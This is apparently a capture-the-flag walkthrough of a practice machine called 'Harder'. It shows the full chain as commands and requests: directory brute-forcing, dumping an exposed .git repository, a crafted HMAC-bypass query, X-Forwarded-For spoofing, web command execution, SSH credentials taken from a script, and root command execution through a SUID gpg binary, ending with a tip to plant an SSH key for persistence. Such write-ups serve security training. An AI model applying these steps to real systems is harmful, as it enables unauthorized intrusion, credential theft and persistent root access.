# recon
3 open ports:
1. 2/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
2. 22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)
3. 80/tcp open  http    nginx 1.18.0

let brute force web directory with gobuster
```console
$ gobuster dir -u http://$IP/ -w /usr/share/SecLists/Discovery/Web-Content/big.txt -x .php,.txt,.html -t 54
```
damn it didnt work. you will get an error message
```
Error: the server returns a status code that matches the provided options for non existing urls. http://10.10.108.12/61668e3a-6bf5-47ae-aca7-79ac2bb9a2f0 => 200. To force processing of Wildcard responses, specify the '--wildcard' switch
```
yes you can use `--wildcard` but you all request will return 200 HTTP code. which is not good. so brute force web directory dosen't work here.

let use web as a happy path and gather more info about web app. There is only one message in home page `404 nothing here`. no robot.txt.

Next I use dev tool and check web request/respone as the room creater suggested. I found some thing in the cookie.
![cookie](../pic/Screenshot%202020-08-20%20at%2012.51.55.png)
so the web domain is `pwd.harder.local` let add domain name to our `/etc/hosts`. now back to your web browser and access `pwd.harder.local`


now let run gobuster again!!

```console
$ gobuster dir -u http://pwd.harder.local/ -w /usr/share/SecLists/Discovery/Web-Content/big.txt -x .php,.txt,.html -t 54
```
here is what I found
1. /auth.php (Status: 200): blank page
2. /credentials.php (Status: 200) : blank page
3. /secret.php (Status: 200) : blank page
4. /index.php (Status: 200)
    - login page admin:admin
    - a message say `extra security in place. our source code will be reviewed soon ...`

the message on `index.php` said `our source code will be reviewed soon ...`. Where do dev are using to keep trace of their source code? yes `Git`. Moreover, This room has git tagg. I try visite `/.git` but reviced 404. 


The plan is we can try to dump the content of the .git repositories from webservers. After some digging, I found 2 tools on github which can be use to prefrom the attack. 
1. [git-scanner](https://github.com/HightechSec/git-scanner)
2. [git-dumper](https://github.com/arthaud/git-dumper)

in this case, we will use `git-dumper`.

```console
kali@kali:~/script/git-dumper$ python3 git-dumper.py http://pwd.harder.local/.git ../../THM/harder/src
kali@kali:~/THM/harder/src$ ls
auth.php  hmac.php  index.php
```
as you see, there are 3 files in git repo. after checking each one of them. `hmac.php` seem like the most juciy ones.

```php
<?php
if (empty($_GET['h']) || empty($_GET['host'])) {
   header('HTTP/1.0 400 Bad Request');
   print("missing get parameter");
   die();
}
require("secret.php"); //set $secret var
if (isset($_GET['n'])) {
   $secret = hash_hmac('sha256', $_GET['n'], $secret);
}

$hm = hash_hmac('sha256', $_GET['host'], $secret);
if ($hm !== $_GET['h']){
  header('HTTP/1.0 403 Forbidden');
  print("extra security check failed");
  die();
}
?>
```
the problem is I not really good at `php` but it seem like if `$hm == $_GET['h']` we migh re recives some juicy stuff. I google `bypassing an HMAC check` and I found [this](https://www.securify.nl/blog/spot-the-bug-challenge-2018-warm-up). 


The link above discribe really clear how we can by pass this, to sum up: if `n` is an array `$secret` will equal to `false`. That mean `$hm = hash_hmac('sha256', $_GET['host'], false);`. We can generate our own `h` that is equal to `$hm` since we know exacly what how `$hm` is generated. Now open php console.
```console
kali@kali:~/THM/harder/src$ php -a
php > $hm = hash_hmac('sha256','kurohatwashere.com',false);
php > print($hm);
abd809f2998ddc00e2e31cf8e8fd2a96d00ae75b71d5b413ae01fc08826f5bb5
```
now we get our `h` let craft own payload:
```
/?n[]=&host=kurohatwashere.com&h=abd809f2998ddc00e2e31cf8e8fd2a96d00ae75b71d5b413ae01fc08826f5bb5
```
nice, we are in. here is the new credential we got.
```
http://shell.harder.local 	evs 	9FRe____________
```
I try to remove cookie so that I can login as `evs` but unforuanly it didnt works. It seem like `evs` is not exist... in this domain. Then I realize tha we got an new domain name, let add it to `/etc/hosts`. at this point ur `/etc/hosts` should looks like this
```
10.10.x.x pwd.harder.local shell.harder.local
```
now visite http://shell.harder.local. the same login page will appear. log in as `evs` you will recives this message
```
Your IP is not allowed to use this webservice. Only 10.10.10.x is allowed
```
I assume that we can access the site coz the website have a whitelist IP which allow only 10.10.10.x. We can add **X-Forwarded-For (XFF)** header to bypass the security. read more [here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For)

now open burp-suit and capture the get request. add `X-Forwarded-For: 10.10.10.x` in http header. the http request should looks something like this:
```
POST /index.php HTTP/1.1
Host: shell.harder.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://shell.harder.local/
Content-Type: application/x-www-form-urlencoded
Content-Length: 63
Connection: close
X-Forwarded-For: 10.10.10.0
Cookie: PHPSESSID=95b0vgsjlqfo59t4inkdqni97o
Upgrade-Insecure-Requests: 1

action=set_login&user=evs&pass=<password>
```
Boom we are in!
![cmd](../pic/Screenshot%202020-08-20%20at%2018.06.57.png) seem like the site allow us to execute command line on the webserver. let try if it works. send the forward the latest request to `Repeater` now we will extent oh requet body by by adding `&cmd=command that we want to execute`

your body should looks something like this:
```php
action=set_login&user=evs&pass=password&cmd=id
```
this is the response we got
```html
<pre>
uid=1001(www) gid=1001(www) groups=1001(www)
</pre>
```
now let recon. luckly we can grab user flag as you www user hehe. so grab user flag `cmd=cat  /home/evs/user.txt`. after some more recon found really intressting script after I use `find` command
```
cmd=find / -user evs 2> /dev/null
cmd=find / -user www 2> /dev/null
```
good luck spoting the file. hint: `___.sh`. Open the file and you will find evs ssh credential
```bash
#!/bin/ash

# ToDo: create a backup script, that saves the /www directory to our internal server
# for authentication use ssh with user &quot;evs&quot; and password &quot;U6j1b_____________&quot;
```

# foot hold & root
ssh to the victim server using the credential we got.
```console
kali@kali:~/THM/harder$ ssh evs@$IP
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <http://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

harder:~$ 
```
now we got foot hold, lets run `suid3num.py` to find suid files.
```
[~] Custom SUID Binaries (Interesting Stuff)
------------------------------
/usr/local/bin/execute-crypted
------------------------------
```
we found some interesting suid file, let run it.
```console
harder:~$ /usr/local/bin/execute-crypted
[*] Current User: root
[-] This program runs only commands which are encypted for root@harder.local using gpg.
[-] Create a file like this: echo -n whoami > command
[-] Encrypt the file and run the command: execute-crypted command.gpg
```
as it said. the program allow us to run command as root with one condition. the command file need to be encypted with  root@harder.local key. I run `gpg -k` to check if there is any key in the key rings. Unfortunately nope. let use `find` to find it. 
```console
harder:~$ find / -name root@harder.local* 2> /dev/null # looking for gpg key
/var/backup/root@harder.local.pub
```
luckly someone left the public key inside `/var/backup/`. now let import the key to `gpg` key ring. if you dont know much about `gpg` run `gpg -h` or do some research by yourself
```console
harder:~$ gpg --import /var/backup/root@harder.local.pub
gpg: directory '/home/evs/.gnupg' created
gpg: keybox '/home/evs/.gnupg/pubring.kbx' created
gpg: /home/evs/.gnupg/trustdb.gpg: trustdb created
gpg: key C91D6615944F6874: public key "Administrator <root@harder.local>" imported
gpg: Total number processed: 1
gpg:               imported: 1
harder:~$ gpg -k
/home/evs/.gnupg/pubring.kbx
----------------------------
pub   ed25519 2020-07-07 [SC]
      6F99621E4D64B6AFCE56E864C91D6615944F6874
uid           [ unknown] Administrator <root@harder.local>
sub   cv25519 2020-07-07 [E]
```
now let do as what the `/usr/local/bin/execute-crypted` say
1. create a command file by using cho -n some command > cmd
2. encrypt in using the key we just import into gpg key ring
3. execute `/usr/local/bin/execute-crypted`
```console
harder:~$ echo -n cat /root/root.txt > cmd # cat root flag
harder:~$ gpg -e -r Administrator cmd  #encrypt the cmd file
gpg: 6C1C04522C049868: There is no assurance this key belongs to the named user

sub  cv25519/6C1C04522C049868 2020-07-07 Administrator <root@harder.local>
 Primary key fingerprint: 6F99 621E 4D64 B6AF CE56  E864 C91D 6615 944F 6874
      Subkey fingerprint: E51F 4262 1DB8 87CB DC36  11CD 6C1C 0452 2C04 9868

It is NOT certain that the key belongs to the person named
in the user ID.  If you *really* know what you are doing,
you may answer the next question with yes.

Use this key anyway? (y/N) y   
harder:~$ /usr/local/bin/execute-crypted cmd.gpg # run the encrypted cmd
gpg: encrypted with 256-bit ECDH key, ID 6C1C04522C049868, created 2020-07-07
      "Administrator <root@harder.local>"
3a7__________________
```

if you wanna gain permanent root. import ur ssh key and put it in `/root/.ssh`. GL have fun